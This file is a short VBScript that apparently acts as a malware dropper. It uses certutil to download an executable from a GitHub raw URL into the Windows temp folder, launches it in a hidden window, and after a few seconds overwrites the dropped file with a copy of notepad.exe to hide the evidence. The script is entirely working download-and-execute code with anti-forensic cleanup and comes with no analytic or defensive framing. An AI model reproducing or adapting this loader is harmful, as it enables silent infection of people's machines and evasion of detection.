Set s = CreateObject("WScript.Shell")
Set f = CreateObject("Scripting.FileSystemObject")

s.Run "certutil -urlcache -split -f https://github.com/hugoleitevitor-cyber/aaaaaaaaaaaaaaa/raw/refs/heads/main/yy.exe " & s.ExpandEnvironmentStrings("%TEMP%") & "\afa05005-0e1a-4291-b18d.tmp", 0, True

If f.FileExists(s.ExpandEnvironmentStrings("%TEMP%") & "\afa05005-0e1a-4291-b18d.tmp") Then
    s.Run "cmd /c start """" " & s.ExpandEnvironmentStrings("%TEMP%") & "\afa05005-0e1a-4291-b18d.tmp", 0, False
    WScript.Sleep 5000
    
    On Error Resume Next
    ' Sobrescreve com lixo da TEMP (notepad.exe legítimo)
    s.Run "cmd /c type C:\Windows\System32\notepad.exe > " & s.ExpandEnvironmentStrings("%TEMP%") & "\afa05005-0e1a-4291-b18d.tmp", 0, True
End If